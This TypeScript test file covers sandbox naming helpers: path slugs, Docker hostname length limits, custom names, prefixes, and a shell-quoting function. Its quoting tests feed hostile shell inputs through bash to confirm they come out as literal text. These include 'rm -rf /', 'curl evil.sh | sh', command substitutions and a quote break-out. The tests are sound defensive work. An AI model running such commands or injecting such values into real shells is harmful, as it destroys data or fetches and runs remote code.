import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { test } from "node:test";

import {
  MAX_HOSTNAME_LENGTH,
  MAX_SANDBOX_PREFIX_LENGTH,
  safeSlug,
  sandboxInstanceName,
  shq,
  customSandboxName,
  normalizeSandboxPrefix,
  MAX_CUSTOM_NAME_LENGTH,
} from "./slug";

test("safeSlug produces a path-safe directory name", () => {
  assert.equal(safeSlug("My Repo"), "my-repo");
  assert.equal(safeSlug("--trim--"), "trim");
  // Never empty: it becomes a directory under /opt/nexus.
  assert.equal(safeSlug(""), "repo");
  assert.equal(safeSlug("///"), "repo");
});

test("safeSlug keeps dots and underscores, which paths allow", () => {
  // Deliberately wider than a DNS label â€” this names a checkout directory, not
  // a hostname. `safeHostName` in template-host.ts is the stricter one.
  assert.equal(safeSlug("api_v2"), "api_v2");
  assert.equal(safeSlug("web.app"), "web.app");
});

// --- sandboxInstanceName -----------------------------------------------------
// Docker hands --hostname to sethostname(2), which rejects anything past
// HOST_NAME_MAX with EINVAL â€” surfacing as "OCI runtime create failed: â€¦
// sethostname: invalid argument", naming neither the limit nor the value.

test("an instance name never exceeds what sethostname accepts", () => {
  // The real failure: a project named by its WSL path.
  const wslProject =
    "\\\\wsl.localhost\\Ubuntu-26.04\\home\\developer\\workspace\\acme\\dashboard-settings-micro-frontend";
  const name = sandboxInstanceName(wslProject, "901e4bcd-dead-beef");
  assert.ok(
    name.length <= MAX_HOSTNAME_LENGTH,
    `${name} is ${name.length} chars, over the ${MAX_HOSTNAME_LENGTH} limit`,
  );
  assert.match(name, /^[a-z0-9][a-z0-9._-]*[a-z0-9]$/);
});

test("truncation keeps the end of a path, which is what names the project", () => {
  const name = sandboxInstanceName(
    "\\\\wsl.localhost\\Ubuntu-26.04\\home\\developer\\workspace\\acme\\dashboard-settings-micro-frontend",
    "901e4b",
  );
  // The head is the share, distro and home dir every project shares; dropping
  // the tail instead would make every sandbox on the machine look alike.
  assert.ok(
    name.includes("micro-frontend"),
    `${name} lost the part that identifies the project`,
  );
});

test("a short name is left intact and stays unique per sandbox", () => {
  assert.equal(sandboxInstanceName("My Repo", "abc123def"), "nexux-my-repo-abc123");
  assert.notEqual(
    sandboxInstanceName("My Repo", "aaaaaa"),
    sandboxInstanceName("My Repo", "bbbbbb"),
  );
});

test("truncation cannot leave a leading or trailing separator", () => {
  // A hostname may not start or end with `-`, and cutting mid-path is exactly
  // how you land on one.
  for (let i = 40; i < 90; i++) {
    const name = sandboxInstanceName("a/".repeat(i), "abc123");
    assert.doesNotMatch(name, /(^-|-$|--)/, `bad separator in ${name}`);
    assert.ok(name.length <= MAX_HOSTNAME_LENGTH);
  }
});

test("a project whose name slugs to nothing still yields a legal hostname", () => {
  const name = sandboxInstanceName("///", "abc123");
  assert.match(name, /^[a-z0-9][a-z0-9._-]*[a-z0-9]$/);
  assert.ok(name.length <= MAX_HOSTNAME_LENGTH);
});

/**
 * `shq` guards every value the bootstrap interpolates into generated shell â€”
 * instance names, image references, auth keys. The assertions below run the
 * quoted result through a real shell: a regex over the output would only prove
 * the string looks escaped, not that bash agrees.
 *
 * Skipped on Windows, where `bash` resolves to `C:\Windows\System32\bash.exe` â€”
 * the WSL launcher, not a shell. It re-parses the command line on the way into
 * the distro, so the quoting under test is destroyed before bash ever sees it
 * and `$(whoami)` comes back expanded. That says nothing about `shq`: the
 * bootstrap this guards runs on Linux instances and in containers.
 */
const realBash = {
  skip:
    process.platform === "win32" &&
    "`bash` here is the WSL launcher, which re-parses argv",
};

function echoThrough(value: string): string {
  return execFileSync("bash", ["-c", `printf '%s' ${shq(value)}`], {
    encoding: "utf8",
  });
}

test("shq round-trips ordinary values through bash unchanged", realBash, () => {
  for (const value of [
    "plain",
    "ghcr.io/ideascoldigital/nexus:latest",
    "with spaces",
    "tskey-auth-abc123",
    "",
  ]) {
    assert.equal(echoThrough(value), value);
  }
});

test("shq neutralises shell metacharacters", realBash, () => {
  for (const value of [
    "a; rm -rf /",
    "a && curl evil.sh | sh",
    "$(whoami)",
    "`id`",
    "a\nb",
    'a"b',
    "$HOME",
    "a > /etc/passwd",
  ]) {
    // The value survives verbatim, which is the same thing as saying the shell
    // never interpreted any of it.
    assert.equal(echoThrough(value), value, `not neutralised: ${value}`);
  }
});

test("shq handles the single quote that would otherwise end the literal", realBash, () => {
  const nasty = "it's";
  assert.equal(echoThrough(nasty), nasty);

  // The classic break-out attempt: close the quote, run a command, reopen.
  const breakout = "x'; echo PWNED; '";
  assert.equal(echoThrough(breakout), breakout);

  // And prove it end to end â€” a successful escape would print PWNED on its own
  // line instead of the literal text.
  const out = execFileSync(
    "bash",
    ["-c", `printf '%s' ${shq(breakout)}`],
    { encoding: "utf8" },
  );
  assert.ok(!out.includes("PWNED\n"));
});

// --- user-chosen names ------------------------------------------------------

test("a chosen name is slugged and used whole, prefix included", () => {
  assert.deepEqual(customSandboxName("API server"), { name: "api-server" });
  assert.deepEqual(customSandboxName("  Reviews  "), { name: "reviews" });
  // Uppercase and spaces are the common case; hostnames allow neither.
  assert.deepEqual(customSandboxName("Feature/Login"), {
    name: "feature-login",
  });
});

test("a chosen name keeps the prefix the user typed, and adds none", () => {
  // The point of choosing: `dev-testing` used to come back as
  // `nexux-dev-testing`, with only the tail actually chosen.
  assert.deepEqual(customSandboxName("dev-testing"), {
    name: "dev-testing",
  });
  assert.deepEqual(customSandboxName("nexux-api"), { name: "nexux-api" });
  // Nothing is added either, so a name is exactly what the field showed.
  assert.deepEqual(customSandboxName("api"), { name: "api" });
});

test("a name with nothing usable in it is refused, not silently defaulted", () => {
  // safeSlug would answer "repo" here — a fine directory and a terrible name
  // for something the user believes they just chose.
  assert.deepEqual(customSandboxName("!!!"), { error: "empty" });
  assert.deepEqual(customSandboxName("   "), { error: "empty" });
  assert.deepEqual(customSandboxName(""), { error: "empty" });
  // …but "repo" typed on purpose is a name like any other.
  assert.deepEqual(customSandboxName("repo"), { name: "repo" });
});

test("a chosen name cannot open or close on a character docker rejects", () => {
  // Container names must start alphanumeric; the prefix used to guarantee it.
  for (const input of ["_leading", "-dash", ".dot", "trailing_", "x-"]) {
    const r = customSandboxName(input);
    assert.ok("name" in r, `${input} was refused outright`);
    assert.match(r.name, /^[a-z0-9].*[a-z0-9]$|^[a-z0-9]$/, `bad: ${r.name}`);
  }
});

test("a name that would break sethostname is refused up front", () => {
  // Over the limit docker fails deep in container init with "sethostname:
  // invalid argument", naming neither the limit nor the value.
  const ok = "a".repeat(MAX_CUSTOM_NAME_LENGTH);
  const result = customSandboxName(ok);
  assert.ok("name" in result);
  assert.equal(result.name.length, MAX_HOSTNAME_LENGTH);

  assert.deepEqual(customSandboxName("a".repeat(MAX_CUSTOM_NAME_LENGTH + 1)), {
    error: "too-long",
  });
});

// --- the generated prefix ---------------------------------------------------

test("a configured prefix replaces the default in generated names", () => {
  assert.equal(
    sandboxInstanceName("My Repo", "abc123def", "dev-"),
    "dev-my-repo-abc123",
  );
  // Absent, the default still applies — every existing caller passes nothing.
  assert.equal(sandboxInstanceName("My Repo", "abc123def"), "nexux-my-repo-abc123");
});

test("a prefix is normalized, and the trailing dash is ours to add", () => {
  assert.deepEqual(normalizeSandboxPrefix("dev"), { prefix: "dev-" });
  assert.deepEqual(normalizeSandboxPrefix("dev-"), { prefix: "dev-" });
  assert.deepEqual(normalizeSandboxPrefix("  Dev QA "), { prefix: "dev-qa-" });
  assert.deepEqual(normalizeSandboxPrefix("!!!"), { error: "invalid" });
  assert.deepEqual(normalizeSandboxPrefix(""), { error: "invalid" });
  assert.deepEqual(normalizeSandboxPrefix("a".repeat(MAX_SANDBOX_PREFIX_LENGTH)), {
    error: "too-long",
  });
});

test("a prefix cannot starve the project or the id out of the name", () => {
  // The cap is what keeps this true; the clamp below is the belt to its braces,
  // for a value that reached us from an import or a hand-edited database.
  const name = sandboxInstanceName("dashboard", "abc123", "x".repeat(80) + "-");
  assert.ok(name.length <= MAX_HOSTNAME_LENGTH, `${name} is ${name.length}`);
  assert.match(name, /^[a-z0-9][a-z0-9._-]*[a-z0-9]$/);
});

test("a generated name stays legal for every plausible prefix", () => {
  for (const p of ["nexux-", "j-", "team-qa-", "x".repeat(23) + "-"]) {
    const name = sandboxInstanceName("a/".repeat(60), "abc123", p);
    assert.ok(name.length <= MAX_HOSTNAME_LENGTH, `${name} is ${name.length}`);
    assert.doesNotMatch(name, /(^-|-$|--)/, `bad separator in ${name}`);
  }
});

test("every accepted name is a legal hostname", () => {
  for (const input of ["API server", "feature/login", "a..b", "-lead-", "ñandú 2"]) {
    const r = customSandboxName(input);
    if ("error" in r) continue;
    assert.match(r.name, /^[a-z0-9][a-z0-9._-]*[a-z0-9]$/, `bad: ${r.name}`);
    assert.ok(r.name.length <= MAX_HOSTNAME_LENGTH);
  }
});
